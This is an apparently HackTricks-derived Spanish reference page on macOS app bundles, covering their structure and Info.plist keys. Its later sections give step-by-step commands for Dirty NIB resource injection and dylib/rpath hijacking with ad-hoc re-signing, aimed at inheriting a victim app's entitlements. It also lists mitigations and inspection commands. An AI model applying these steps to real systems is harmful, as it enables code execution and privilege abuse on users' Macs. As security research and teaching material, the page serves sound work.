# Bundles de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información básica

Los bundles en macOS sirven como contenedores para una variedad de recursos, incluyendo aplicaciones, bibliotecas y otros archivos necesarios, haciéndolos aparecer como objetos únicos en Finder, como los familiares `*.app` files. El bundle más común es el `.app` bundle, aunque también son habituales otros tipos como `.framework`, `.systemextension` y `.kext`.

### Componentes esenciales de un bundle

Dentro de un bundle, especialmente en el directorio `<application>.app/Contents/`, se alojan diversos recursos importantes:

- **\_CodeSignature**: Este directorio almacena los detalles de firma de código esenciales para verificar la integridad de la aplicación. Puedes inspeccionar la información de firma de código usando comandos como:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Contiene el binario ejecutable de la aplicación que se ejecuta al interactuar el usuario.
- **Resources**: Un repositorio para los componentes de la interfaz de usuario de la aplicación incluyendo imágenes, documentos y descripciones de interfaz (nib/xib files).
- **Info.plist**: Actúa como el archivo de configuración principal de la aplicación, crucial para que el sistema reconozca e interactúe correctamente con la aplicación.

#### Claves importantes en Info.plist

El archivo `Info.plist` es una piedra angular para la configuración de la aplicación, y contiene claves como:

- **CFBundleExecutable**: Especifica el nombre del archivo ejecutable principal ubicado en el directorio `Contents/MacOS`.
- **CFBundleIdentifier**: Proporciona un identificador global para la aplicación, usado extensamente por macOS para la gestión de aplicaciones.
- **LSMinimumSystemVersion**: Indica la versión mínima de macOS requerida para que la aplicación se ejecute.

### Explorando bundles

Para explorar el contenido de un bundle, como `Safari.app`, se puede usar el siguiente comando: `bash ls -lR /Applications/Safari.app/Contents`

Esta exploración revela directorios como `_CodeSignature`, `MacOS`, `Resources`, y archivos como `Info.plist`, cada uno con un propósito único, desde asegurar la aplicación hasta definir su interfaz de usuario y parámetros operativos.

#### Directorios adicionales del bundle

Más allá de los directorios comunes, los bundles también pueden incluir:

- **Frameworks**: Contiene frameworks incluidos usados por la aplicación. Los frameworks son como dylibs con recursos adicionales.
- **PlugIns**: Un directorio para plug-ins y extensiones que amplían las capacidades de la aplicación.
- **XPCServices**: Aloja servicios XPC usados por la aplicación para comunicación fuera de proceso.

Esta estructura asegura que todos los componentes necesarios estén encapsulados dentro del bundle, facilitando un entorno de aplicación modular y seguro.

Para obtener información más detallada sobre las claves de `Info.plist` y sus significados, la documentación para desarrolladores de Apple ofrece recursos extensos: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Notas de seguridad y vectores de abuso

- **Gatekeeper / App Translocation**: Cuando un bundle en cuarentena se ejecuta por primera vez, macOS realiza una verificación profunda de la firma y puede ejecutarlo desde una ruta translocada aleatoria. Una vez aceptado, los lanzamientos posteriores solo realizan verificaciones superficiales; los archivos de recursos en `Resources/`, `PlugIns/`, nibs, etc., históricamente no eran comprobados. Desde macOS 13 Ventura se aplica una verificación profunda en la primera ejecución y el nuevo permiso *App Management* de TCC restringe que procesos de terceros modifiquen otros bundles sin el consentimiento del usuario, pero los sistemas más antiguos siguen siendo vulnerables.
- **Bundle Identifier collisions**: Múltiples targets embebidos (PlugIns, helper tools) que reutilizan el mismo `CFBundleIdentifier` pueden romper la validación de firma y ocasionalmente permitir hijacking/confusión de URL‑schemes. Siempre enumera los sub‑bundles y verifica IDs únicos.

## Resource Hijacking (Dirty NIB / NIB Injection)

Antes de Ventura, intercambiar recursos de UI en una app firmada podía evadir el shallow code signing y generar code execution con los entitlements de la app. Investigación reciente (2024) muestra que esto aún funciona en sistemas pre‑Ventura y en builds no en cuarentena:

1. Copia la app objetivo a una ubicación escribible (p. ej., `/tmp/Victim.app`).
2. Reemplaza `Contents/Resources/MainMenu.nib` (o cualquier nib declarado en `NSMainNibFile`) por uno malicioso que instancie `NSAppleScript`, `NSTask`, etc.
3. Lanza la app. El nib malicioso se ejecuta bajo el bundle ID y los entitlements de la víctima (permisos TCC, micrófono/cámara, etc.).
4. Ventura+ mitiga esto verificando profundamente el bundle en el primer lanzamiento y requiriendo el permiso *App Management* para modificaciones posteriores, por lo que la persistencia es más difícil, pero los ataques en el primer lanzamiento en versiones anteriores de macOS siguen siendo aplicables.

Ejemplo mínimo de payload malicioso en nib (compila xib a nib con `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking dentro de Bundles

Porque las búsquedas de `@rpath` prefieren Frameworks/PlugIns incluidos en el bundle, dejar una librería maliciosa dentro de `Contents/Frameworks/` o `Contents/PlugIns/` puede redirigir el orden de carga cuando el binario principal está firmado sin library validation o con un orden `LC_RPATH` débil.

Pasos típicos al abusar de un bundle unsigned/ad‑hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notas:
- Hardened runtime con `com.apple.security.cs.disable-library-validation` ausente bloquea dylibs de terceros; comprueba los entitlements primero.
- XPC services bajo `Contents/XPCServices/` a menudo cargan sibling frameworks — patch their binaries de forma similar para rutas de persistence o privilege escalation.

## Hoja de referencia rápida de inspección
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referencias

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
